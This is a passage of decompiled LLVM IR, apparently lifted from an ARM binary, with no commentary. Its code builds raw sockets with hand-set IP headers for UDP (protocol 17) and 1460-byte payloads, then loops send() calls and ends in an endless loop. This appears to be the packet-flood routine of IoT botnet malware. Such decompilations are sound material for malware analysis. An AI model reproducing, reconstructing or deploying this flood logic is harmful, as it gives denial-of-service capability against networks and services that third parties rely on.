  %v1_dda8 = add i32 %v0_dda8, 24
  store i32 %v1_dda8, i32* %r5.global-to-local, align 4
  br i1 %v9_dda0, label %dec_label_pc_de24.preheader, label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dd80, %dec_label_pc_dc84
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_dc84 ], [ %v1_dd9c, %dec_label_pc_dd80 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_dc84 ], [ %v1_dcd8, %dec_label_pc_dd80 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_ddbc = call i32* @calloc(i32 65535, i32 1)
  %v3_ddbc = ptrtoint i32* %v2_ddbc to i32
  store i32 %v3_dbf0, i32* %r1.global-to-local, align 4
  %v2_ddd0 = load i32, i32* @sl, align 4
  %v3_ddd0 = add i32 %v2_ddd0, %stack_var_-60.0
  %v4_ddd0 = inttoptr i32 %v3_ddd0 to i32*
  store i32 %v3_ddbc, i32* %v4_ddd0, align 4
  br i1 %v3_ddcc, label %dec_label_pc_ddd8, label %dec_label_pc_dcc4

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddb0
  %v0_ddd8 = call i32 @function_10b68()
  %v1_ddd8 = trunc i32 %v0_ddd8 to i8
  %v4_dddc = sdiv i32 %v0_ddd8, 256
  %v1_dde0 = trunc i32 %v4_dddc to i8
  %v2_dde0 = load i32, i32* %r5.global-to-local, align 4
  %v3_dde0 = add i32 %v2_dde0, 3
  %v4_dde0 = inttoptr i32 %v3_dde0 to i8*
  store i8 %v1_dde0, i8* %v4_dde0, align 1
  %v3_dde4 = load i32, i32* %r5.global-to-local, align 4
  %v4_dde4 = add i32 %v3_dde4, 2
  %v5_dde4 = inttoptr i32 %v4_dde4 to i8*
  store i8 %v1_ddd8, i8* %v5_dde4, align 1
  br label %dec_label_pc_dcd0

dec_label_pc_ddec:                                ; preds = %dec_label_pc_de24.loopexit, %dec_label_pc_de24.preheader, %dec_label_pc_de28.loopexit, %dec_label_pc_ddec
  br label %dec_label_pc_ddec

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_ddf0.lr.ph, %dec_label_pc_de28.loopexit
  %v0_ddf0 = load i32, i32* @r8, align 4
  %v2_ddf0 = icmp eq i32 %v0_ddf0, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_ddf0, label %dec_label_pc_ddf8, label %dec_label_pc_de38

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddf0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %dec_label_pc_de00, %dec_label_pc_ddf8
  %v0_de08 = phi i32 [ %v1_de08, %dec_label_pc_de00 ], [ 0, %dec_label_pc_ddf8 ]
  %v0_de00 = phi i32 [ %v1_de1c, %dec_label_pc_de00 ], [ 0, %dec_label_pc_ddf8 ]
  %v1_de00 = load i32, i32* @sb, align 4
  %v2_de00 = add i32 %v1_de00, %v0_de00
  %v3_de00 = inttoptr i32 %v2_de00 to i32*
  %v4_de00 = load i32, i32* %v3_de00, align 4
  %v1_de04 = load i32, i32* @sl, align 4
  %v2_de04 = add i32 %v1_de04, %v0_de00
  %v3_de04 = inttoptr i32 %v2_de04 to i32*
  %v4_de04 = load i32, i32* %v3_de04, align 4
  store i32 %v4_de04, i32* %r1.global-to-local, align 4
  %v1_de08 = add i32 %v0_de08, 1
  store i32 %v1_de08, i32* %r5.global-to-local, align 4
  %v0_de0c = load i32, i32* @r6, align 4
  %v4_de14 = inttoptr i32 %v4_de04 to i32*
  %v5_de14 = call i32 @send(i32 %v4_de00, i32* %v4_de14, i32 %v0_de0c, i32 16384)
  %v1_de18 = load i32, i32* @r7, align 4
  %v9_de18 = icmp eq i32 %v1_de08, %v1_de18
  %v0_de1c = load i32, i32* %r4.global-to-local, align 4
  %v1_de1c = add i32 %v0_de1c, 4
  store i32 %v1_de1c, i32* %r4.global-to-local, align 4
  br i1 %v9_de18, label %dec_label_pc_de24.loopexit, label %dec_label_pc_de00

dec_label_pc_de24.loopexit:                       ; preds = %dec_label_pc_de00
  %tmp4348 = icmp slt i32 %v1_de08, 1
  br i1 %tmp4348, label %dec_label_pc_ddec, label %dec_label_pc_ddf0.lr.ph

dec_label_pc_ddf0.lr.ph:                          ; preds = %dec_label_pc_de24.preheader, %dec_label_pc_de24.loopexit
  br label %dec_label_pc_ddf0

dec_label_pc_de28.loopexit:                       ; preds = %dec_label_pc_de40
  %tmp43 = icmp slt i32 %v0_de68, 1
  br i1 %tmp43, label %dec_label_pc_ddec, label %dec_label_pc_ddf0

dec_label_pc_de30:                                ; preds = %dec_label_pc_dcd0
  store i32 %v3_db98, i32* %r4.global-to-local, align 4
  store i32 %v6_db98, i32* %r5.global-to-local, align 4
  store i32 %v24_db98, i32* %fp.global-to-local, align 4
  ret i32 %v3_dce8

dec_label_pc_de38:                                ; preds = %dec_label_pc_ddf0
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %dec_label_pc_de40, %dec_label_pc_de38
  %v0_de40 = phi i32 [ %v1_de6c, %dec_label_pc_de40 ], [ 0, %dec_label_pc_de38 ]
  %v1_de40 = load i32, i32* @sl, align 4
  %v2_de40 = add i32 %v1_de40, %v0_de40
  %v3_de40 = inttoptr i32 %v2_de40 to i32*
  %v4_de40 = load i32, i32* %v3_de40, align 4
  store i32 %v4_de40, i32* @r4, align 4
  %v0_de44 = load i32, i32* @r6, align 4
  store i32 %v0_de44, i32* @r1, align 4
  %v1_de4c = inttoptr i32 %v4_de40 to i8*
  %v2_de4c = call i32 @function_10d44(i8* %v1_de4c)
  %v0_de50 = load i32, i32* @r5, align 4
  %v1_de50 = add i32 %v0_de50, 1
  store i32 %v1_de50, i32* @r5, align 4
  %v0_de54 = load i32, i32* @fp, align 4
  %v1_de54 = load i32, i32* @sb, align 4
  %v2_de54 = add i32 %v1_de54, %v0_de54
  %v3_de54 = inttoptr i32 %v2_de54 to i32*
  %v4_de54 = load i32, i32* %v3_de54, align 4
  %v0_de58 = load i32, i32* @r4, align 4
  store i32 %v0_de58, i32* %r1.global-to-local, align 4
  %v0_de5c = load i32, i32* @r6, align 4
  %v4_de64 = inttoptr i32 %v0_de58 to i32*
  %v5_de64 = call i32 @send(i32 %v4_de54, i32* %v4_de64, i32 %v0_de5c, i32 16384)
  %v0_de68 = load i32, i32* @r5, align 4
  %v1_de68 = load i32, i32* @r7, align 4
  %v9_de68 = icmp eq i32 %v0_de68, %v1_de68
  %v0_de6c = load i32, i32* @fp, align 4
  %v1_de6c = add i32 %v0_de6c, 4
  store i32 %v1_de6c, i32* @fp, align 4
  br i1 %v9_de68, label %dec_label_pc_de28.loopexit, label %dec_label_pc_de40

; uselistorder directives
  uselistorder i32 %v1_de6c, { 1, 0 }
  uselistorder i32 %v0_de68, { 1, 0 }
  uselistorder i32 %v1_de1c, { 1, 0 }
  uselistorder i32 %v1_de08, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_dd8c, { 1, 0 }
  uselistorder i32 %v8_dd5c, { 1, 2, 0 }
  uselistorder i32 %v3_dd34, { 1, 2, 0, 3 }
  uselistorder i32 %v3_dce8, { 1, 3, 2, 0 }
  uselistorder i32 %v1_dcd8, { 1, 2, 0 }
  uselistorder i32 %v3_dcac, { 1, 0 }
  uselistorder i32 %v3_dc88, { 1, 0 }
  uselistorder i32 %v3_dc40, { 0, 2, 1 }
  uselistorder i32 %v3_dbf0, { 0, 2, 1 }
  uselistorder i32 %v1_db9c, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 2, 5, 10, 6, 7, 8, 9, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_ddf0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ddf0, { 1, 0 }
  uselistorder label %dec_label_pc_ddec, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_dd80, { 1, 0 }
  uselistorder label %dec_label_pc_dc7c, { 1, 0 }
}

define i32 @function_de7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de7c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_de7c = load i32, i32* @r4, align 4
  %v6_de7c = load i32, i32* @r5, align 4
  %v9_de7c = load i32, i32* @r6, align 4
  %v12_de7c = load i32, i32* @r7, align 4
  %v18_de7c = load i32, i32* @sb, align 4
  %v24_de7c = load i32, i32* @fp, align 4
  %v1_de80 = urem i32 %arg1, 256
  store i32 %v1_de80, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_de80, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_de98 = urem i32 %arg3, 256
  store i32 %v1_de98, i32* @r4, align 4
  %v2_de9c = call i32* @calloc(i32 %v1_de80, i32 4)
  %v4_de9c = ptrtoint i32* %v2_de9c to i32
  %v0_dea0 = load i32, i32* @r5, align 4
  store i32 %v0_dea0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_deb0 = load i32, i32* @r4, align 4
  store i32 %v0_deb0, i32* %r0.global-to-local, align 4
  %v5_deb4 = inttoptr i32 %v0_dea0 to i32*
  %v6_deb4 = call i32 @function_b240(i32 %v0_deb0, i32* %v5_deb4, i32 2, i32 0)
  %v1_dec0 = urem i32 %v6_deb4, 256
  store i32 %v1_dec0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_decc = load i32, i32* @r5, align 4
  store i32 %v0_decc, i32* %r1.global-to-local, align 4
  %v0_ded0 = load i32, i32* @r4, align 4
  store i32 %v0_ded0, i32* %r0.global-to-local, align 4
  %v5_ded4 = trunc i32 %v6_deb4 to i8
  %v6_ded8 = inttoptr i32 %v0_decc to i32*
  %v7_ded8 = call i32 @function_b240(i32 %v0_ded0, i32* %v6_ded8, i32 3, i32 65535)
  %v0_dedc = load i32, i32* @r5, align 4
  store i32 %v0_dedc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ded8, i32* %fp.global-to-local, align 4
  %v0_deec = load i32, i32* @r4, align 4
  store i32 %v0_deec, i32* %r0.global-to-local, align 4
  %v4_def0 = inttoptr i32 %v0_dedc to i32*
  %v5_def0 = call i32 @function_b240(i32 %v0_deec, i32* %v4_def0, i32 4, i32 64)
  %v1_def8 = urem i32 %v5_def0, 256
  store i32 %v1_def8, i32* %ip.global-to-local, align 4
  %v0_defc = load i32, i32* @r5, align 4
  store i32 %v0_defc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_df08 = load i32, i32* @r4, align 4
  store i32 %v0_df08, i32* %r0.global-to-local, align 4
  %v5_df0c = trunc i32 %v5_def0 to i8
  %v6_df10 = inttoptr i32 %v0_defc to i32*
  %v7_df10 = call i32 @function_b240(i32 %v0_df08, i32* %v6_df10, i32 5, i32 0)
  %v1_df1c = urem i32 %v7_df10, 256
  store i32 %v1_df1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_df28 = load i32, i32* @r5, align 4
  store i32 %v0_df28, i32* %r1.global-to-local, align 4
  %v0_df2c = load i32, i32* @r4, align 4
  store i32 %v0_df2c, i32* %r0.global-to-local, align 4
  %v5_df34 = inttoptr i32 %v0_df28 to i32*
  %v6_df34 = call i32 @function_b240(i32 %v0_df2c, i32* %v5_df34, i32 6, i32 65535)
  %v0_df3c = load i32, i32* @r5, align 4
  store i32 %v0_df3c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_df34, i32* @r7, align 4
  %v0_df4c = load i32, i32* @r4, align 4
  store i32 %v0_df4c, i32* %r0.global-to-local, align 4
  %v4_df50 = inttoptr i32 %v0_df3c to i32*
  %v5_df50 = call i32 @function_b240(i32 %v0_df4c, i32* %v4_df50, i32 7, i32 65535)
  %v0_df54 = load i32, i32* @r5, align 4
  store i32 %v0_df54, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_df50, i32* %sb.global-to-local, align 4
  %v0_df64 = load i32, i32* @r4, align 4
  store i32 %v0_df64, i32* %r0.global-to-local, align 4
  %v4_df68 = inttoptr i32 %v0_df54 to i32*
  %v5_df68 = call i32 @function_b240(i32 %v0_df64, i32* %v4_df68, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_df74 = load i32, i32* @r5, align 4
  store i32 %v0_df74, i32* %r1.global-to-local, align 4
  store i32 %v5_df68, i32* @r6, align 4
  %v0_df7c = load i32, i32* @r4, align 4
  store i32 %v0_df7c, i32* %r0.global-to-local, align 4
  %v4_df80 = inttoptr i32 %v0_df74 to i32*
  %v5_df80 = call i32 @function_b240(i32 %v0_df7c, i32* %v4_df80, i32 1, i32 1)
  %v2_df8c = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_df8c, i32* %r3.global-to-local, align 4
  %v1_df90 = urem i32 %v5_df80, 256
  store i32 %v1_df90, i32* %ip.global-to-local, align 4
  %v0_df94 = load i32, i32* @r5, align 4
  store i32 %v0_df94, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_df9c = load i32, i32* @r4, align 4
  store i32 %v0_df9c, i32* %r0.global-to-local, align 4
  %v5_dfa4 = inttoptr i32 %v0_df94 to i32*
  %v6_dfa4 = call i32 @function_b240(i32 %v0_df9c, i32* %v5_dfa4, i32 25, i32 %v2_df8c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_dfb8 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_dfb8, i32* %r0.global-to-local, align 4
  %v7_dfbc = icmp eq i32 %v3_dfb8, -1
  store i1 %v7_dfbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dfbc, label %dec_label_pc_e3e4, label %dec_label_pc_dfc8

dec_label_pc_dfc8:                                ; preds = %dec_label_pc_de7c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_dfd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_dfd0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_dfe4 = call i32 @setsockopt(i32 %v3_dfb8, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_dfe4, i32* %r0.global-to-local, align 4
  %v7_dfe8 = icmp eq i32 %v7_dfe4, -1
  store i1 %v7_dfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dfe8, label %dec_label_pc_e3dc, label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfc8
  %v0_dff0 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_dffc = urem i32 %v0_dff0, 65536
  store i32 %v3_dffc, i32* %r2.global-to-local, align 4
  %v3_e000 = icmp ugt i32 %v3_dffc, 1459
  %v9_e000 = icmp eq i32 %v3_dffc, 1460
  store i1 %v9_e000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e000, label %bb, label %bb72

bb:                                               ; preds = %dec_label_pc_dff0
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_dff0, %bb
  %v0_e008 = phi i32 [ %v3_dffc, %dec_label_pc_dff0 ], [ 1460, %bb ]
  %v0_e00c = load i32, i32* %fp.global-to-local, align 4
  %v3_e00c = mul i32 %v0_e00c, 65536
  store i32 %v3_e00c, i32* %r0.global-to-local, align 4
  %v3_e010 = urem i32 %v0_e00c, 65536
  store i32 %v3_e010, i32* %r2.global-to-local, align 4
  %v0_e014 = load i32, i32* @sl, align 4
  %v2_e014 = icmp eq i32 %v0_e014, 0
  store i1 %v2_e014, i1* %cpsr_z.global-to-local, align 1
  %v0_e018 = load i32, i32* %sb.global-to-local, align 4
  %v3_e018 = mul i32 %v0_e018, 65536
  store i32 %v3_e018, i32* %r5.global-to-local, align 4
  %v0_e01c = load i32, i32* @r7, align 4
  %v3_e01c = mul i32 %v0_e01c, 65536
  store i32 %v3_e01c, i32* %r7.global-to-local, align 4
  %tmp73 = icmp slt i32 %v0_e014, 1
  br i1 %tmp73, label %bb74, label %bb75

bb74:                                             ; preds = %bb72
  store i32 %v0_e008, i32* %r2.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %bb72, %bb74
  %v5_e044 = phi i32 [ %v3_e010, %bb72 ], [ %v0_e008, %bb74 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e02c = urem i32 %v0_e01c, 65536
  store i32 %v3_e02c, i32* %r3.global-to-local, align 4
  %v3_e030 = urem i32 %v0_e018, 65536
  store i32 %v3_e030, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp73, label %.thread, label %dec_label_pc_e04c

.thread:                                          ; preds = %bb75
  %v6_e040 = add nsw i32 %v5_e044, 28
  store i32 %v6_e040, i32* @fp, align 4
  %v6_e044 = add nsw i32 %v5_e044, 8
  store i32 %v6_e044, i32* @sb, align 4
  br label %dec_label_pc_e1c0

dec_label_pc_e04c:                                ; preds = %bb75
  %v1_e050 = add nuw nsw i32 %v0_e008, 28
  store i32 %v1_e050, i32* @fp, align 4
  %tmp76 = mul nuw nsw i32 %v1_e050, 256
  %v1_e05c = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v0_e00c, 256
  %v3_e060 = urem i32 %tmp77, 256
  %v2_e074 = icmp eq i32 %v1_df1c, 0
  store i1 %v2_e074, i1* %cpsr_z.global-to-local, align 1
  %v1_e078 = urem i32 %v0_e00c, 256
  %v1_e080 = add nuw nsw i32 %v0_e008, 8
  store i32 %v1_e080, i32* @sb, align 4
  %v3_e084 = mul i32 %v1_e080, 65536
  store i32 %v3_e084, i32* %r6.global-to-local, align 4
  %v1_e088 = urem i32 %v0_e01c, 256
  %v1_e08c = urem i32 %v0_e018, 256
  store i32 %v1_e08c, i32* %ip.global-to-local, align 4
  store i32 %v1_e05c, i32* %r3.global-to-local, align 4
  %tmp78 = mul nuw nsw i32 %v1_e080, 256
  %v4_e098 = mul nuw nsw i32 %v1_e078, 256
  %v5_e098 = or i32 %v4_e098, %v3_e060
  store i32 %v5_e098, i32* %r0.global-to-local, align 4
  %v3_e09c = mul nuw nsw i32 %v1_e088, 256
  store i32 %v3_e09c, i32* %r2.global-to-local, align 4
  %tmp79 = udiv i32 %v0_e018, 256
  %v3_e0a0 = urem i32 %tmp79, 256
  %v1_e0a4 = and i32 %tmp78, 65280
  store i32 %v1_e0a4, i32* %r1.global-to-local, align 4
  %tmp80 = udiv i32 %v1_e050, 256
  %tmp81 = udiv i32 %v0_e01c, 256
  %v4_e0ac = urem i32 %tmp81, 256
  %v5_e0ac = or i32 %v4_e0ac, %v3_e09c
  store i32 %v5_e0ac, i32* %r4.global-to-local, align 4
  %v5_e0b0 = trunc i32 %tmp80 to i8
  %v5_e0b4 = trunc i32 %tmp77 to i8
  %v4_e0b8 = mul nuw nsw i32 %v1_e08c, 256
  %v5_e0b8 = or i32 %v4_e0b8, %v3_e0a0
  store i32 %v5_e0b8, i32* %r5.global-to-local, align 4
  %tmp82 = udiv i32 %v1_e080, 256
  %v4_e0bc = urem i32 %tmp82, 256
  %v5_e0bc = or i32 %v4_e0bc, %v1_e0a4
  store i32 %v5_e0bc, i32* %r7.global-to-local, align 4
  br i1 %v2_e074, label %dec_label_pc_e0c4, label %dec_label_pc_e3ec

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e04c
  %v3_e0c437 = udiv i32 %v1_e05c, 256
  store i32 %v3_e0c437, i32* %ip.global-to-local, align 4
  store i32 %v1_e078, i32* %r0.global-to-local, align 4
  store i32 %v1_e088, i32* %r1.global-to-local, align 4
  store i32 %v1_e08c, i32* %r2.global-to-local, align 4
  %v3_e0d438 = udiv i32 %v1_e0a4, 256
  store i32 %v3_e0d438, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_e138 = sext i8 %v5_ded4 to i32
  %v4_e178 = sext i8 %v5_e0b4 to i32
  %sext16 = mul i32 %v0_e00c, 16777216
  %v4_e17c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_e01c, 16777216
  %v4_e194 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v1_e080, 16777216
  %v4_e198 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_e018, 16777216
  %v4_e19c = sdiv i32 %sext19, 16777216
  %v1_e184 = trunc i32 %v1_e050 to i8
  %v1_e1a4 = trunc i32 %v4_e198 to i8
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0f0, %dec_label_pc_e0c4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e0fc = call i32* @calloc(i32 1510, i32 1)
  %v4_e0fc = ptrtoint i32* %v2_e0fc to i32
  store i32 %v4_e0fc, i32* %r0.global-to-local, align 4
  store i32 %v4_de9c, i32* %ip.global-to-local, align 4
  %v3_e104 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e104, i32* %r2.global-to-local, align 4
  %v2_e108 = load i32, i32* %r6.global-to-local, align 4
  %v5_e108 = mul i32 %v2_e108, 4
  %v6_e108 = add i32 %v5_e108, %v4_de9c
  %v7_e108 = inttoptr i32 %v6_e108 to i32*
  store i32 %v4_e0fc, i32* %v7_e108, align 4
  %v0_e10c = load i32, i32* %ip.global-to-local, align 4
  %v1_e10c = load i32, i32* %r2.global-to-local, align 4
  %v4_e10c = mul i32 %v1_e10c, 4
  %v5_e10c = add i32 %v4_e10c, %v0_e10c
  %v6_e10c = inttoptr i32 %v5_e10c to i32*
  %v7_e10c = load i32, i32* %v6_e10c, align 4
  store i32 %v7_e10c, i32* %r1.global-to-local, align 4
  %v1_e110 = inttoptr i32 %v7_e10c to i8*
  %v2_e110 = load i8, i8* %v1_e110, align 1
  %tmp = urem i8 %v2_e110, 16
  %v1_e114 = zext i8 %tmp to i32
  %v1_e118 = or i32 %v1_e114, 64
  store i32 %v1_e118, i32* %r3.global-to-local, align 4
  %v1_e11c = trunc i32 %v1_e118 to i8
  store i8 %v1_e11c, i8* %v1_e110, align 1
  %v0_e120 = load i32, i32* %r1.global-to-local, align 4
  %v1_e120 = inttoptr i32 %v0_e120 to i8*
  %v2_e120 = load i8, i8* %v1_e120, align 1
  %v3_e120 = zext i8 %v2_e120 to i32
  %v1_e124 = and i32 %v3_e120, 240
  %v1_e128 = or i32 %v1_e124, 5
  store i32 %v1_e128, i32* %r2.global-to-local, align 4
  %v3_e130 = add i32 %v0_e120, 9
  %v4_e130 = inttoptr i32 %v3_e130 to i8*
  store i8 17, i8* %v4_e130, align 1
  %v0_e134 = load i32, i32* %r2.global-to-local, align 4
  %v1_e134 = trunc i32 %v0_e134 to i8
  %v2_e134 = load i32, i32* %r1.global-to-local, align 4
  %v3_e134 = inttoptr i32 %v2_e134 to i8*
  store i8 %v1_e134, i8* %v3_e134, align 1
  store i32 %v4_e138, i32* %r0.global-to-local, align 4
  %v2_e13c = load i32, i32* %r1.global-to-local, align 4
  %v3_e13c = add i32 %v2_e13c, 1
  %v4_e13c = inttoptr i32 %v3_e13c to i8*
  store i8 %v5_ded4, i8* %v4_e13c, align 1
  %v2_e144 = load i32, i32* %r1.global-to-local, align 4
  %v3_e144 = add i32 %v2_e144, 8
  %v4_e144 = inttoptr i32 %v3_e144 to i8*
  store i8 %v5_df0c, i8* %v4_e144, align 1
  %v3_e148 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e148, i32* %r2.global-to-local, align 4
  store i32 %v6_dfa4, i32* %ip.global-to-local, align 4
  %v3_e150 = mul i32 %v3_e148, 32
  store i32 %v3_e150, i32* %r3.global-to-local, align 4
  %v1_e154 = load i32, i32* %r1.global-to-local, align 4
  %v2_e154 = add i32 %v1_e154, 12
  %v3_e154 = inttoptr i32 %v2_e154 to i32*
  store i32 %v6_dfa4, i32* %v3_e154, align 4
  %v0_e158 = load i32, i32* %r3.global-to-local, align 4
  %v1_e158 = load i32, i32* %r2.global-to-local, align 4
  %tmp84 = mul i32 %v1_e158, -8
  %v5_e158 = add i32 %v0_e158, %tmp84
  %v1_e15c = load i32, i32* @r8, align 4
  %v2_e15c = add i32 %v5_e158, %v1_e15c
  store i32 %v2_e15c, i32* %r3.global-to-local, align 4
  %v1_e160 = add i32 %v2_e15c, 16
  %v2_e160 = inttoptr i32 %v1_e160 to i32*
  %v3_e160 = load i32, i32* %v2_e160, align 4
  %v1_e164 = load i32, i32* %r1.global-to-local, align 4
  %v2_e164 = add i32 %v1_e164, 16
  %v3_e164 = inttoptr i32 %v2_e164 to i32*
  store i32 %v3_e160, i32* %v3_e164, align 4
  %v0_e16c = load i32, i32* %r2.global-to-local, align 4
  %v1_e16c = add i32 %v0_e16c, 1
  store i32 %v1_e16c, i32* %r6.global-to-local, align 4
  %v2_e170 = load i32, i32* %r1.global-to-local, align 4
  %v3_e170 = add i32 %v2_e170, 2
  %v4_e170 = inttoptr i32 %v3_e170 to i8*
  store i8 %v5_e0b0, i8* %v4_e170, align 1
  store i32 %v4_e178, i32* %ip.global-to-local, align 4
  store i32 %v4_e17c, i32* %r0.global-to-local, align 4
  %v0_e180 = load i32, i32* %r1.global-to-local, align 4
  %v1_e180 = add i32 %v0_e180, 20
  store i32 %v1_e180, i32* %r3.global-to-local, align 4
  %v3_e184 = add i32 %v0_e180, 3
  %v4_e184 = inttoptr i32 %v3_e184 to i8*
  store i8 %v1_e184, i8* %v4_e184, align 1
  %v0_e188 = load i32, i32* %ip.global-to-local, align 4
  %v1_e188 = trunc i32 %v0_e188 to i8
  %v2_e188 = load i32, i32* %r1.global-to-local, align 4
  %v3_e188 = add i32 %v2_e188, 4
  %v4_e188 = inttoptr i32 %v3_e188 to i8*
  store i8 %v1_e188, i8* %v4_e188, align 1
  %v0_e18c = load i32, i32* %r0.global-to-local, align 4
  %v1_e18c = trunc i32 %v0_e18c to i8
  %v2_e18c = load i32, i32* %r1.global-to-local, align 4
  %v3_e18c = add i32 %v2_e18c, 5
  %v4_e18c = inttoptr i32 %v3_e18c to i8*
  store i8 %v1_e18c, i8* %v4_e18c, align 1
  %v0_e190 = load i32, i32* %r4.global-to-local, align 4
  %v1_e190 = trunc i32 %v0_e190 to i8
  %v2_e190 = load i32, i32* %r1.global-to-local, align 4
  %v3_e190 = add i32 %v2_e190, 20
  %v4_e190 = inttoptr i32 %v3_e190 to i8*
  store i8 %v1_e190, i8* %v4_e190, align 1
  store i32 %v4_e194, i32* %r2.global-to-local, align 4
  store i32 %v4_e198, i32* %r1.global-to-local, align 4
  store i32 %v4_e19c, i32* %ip.global-to-local, align 4
  %v0_e1a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_e1a0 = load i32, i32* @sl, align 4
  %v9_e1a0 = icmp eq i32 %v0_e1a0, %v1_e1a0
  store i1 %v9_e1a0, i1* %cpsr_z.global-to-local, align 1
  %v2_e1a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1a4 = add i32 %v2_e1a4, 5
  %v4_e1a4 = inttoptr i32 %v3_e1a4 to i8*
  store i8 %v1_e1a4, i8* %v4_e1a4, align 1
  %v0_e1a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1a8 = trunc i32 %v0_e1a8 to i8
  %v2_e1a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1a8 = add i32 %v2_e1a8, 1
  %v4_e1a8 = inttoptr i32 %v3_e1a8 to i8*
  store i8 %v1_e1a8, i8* %v4_e1a8, align 1
  %v0_e1ac = load i32, i32* %r5.global-to-local, align 4
  %v1_e1ac = trunc i32 %v0_e1ac to i8
  %v2_e1ac = load i32, i32* %r3.global-to-local, align 4
  %v3_e1ac = add i32 %v2_e1ac, 2
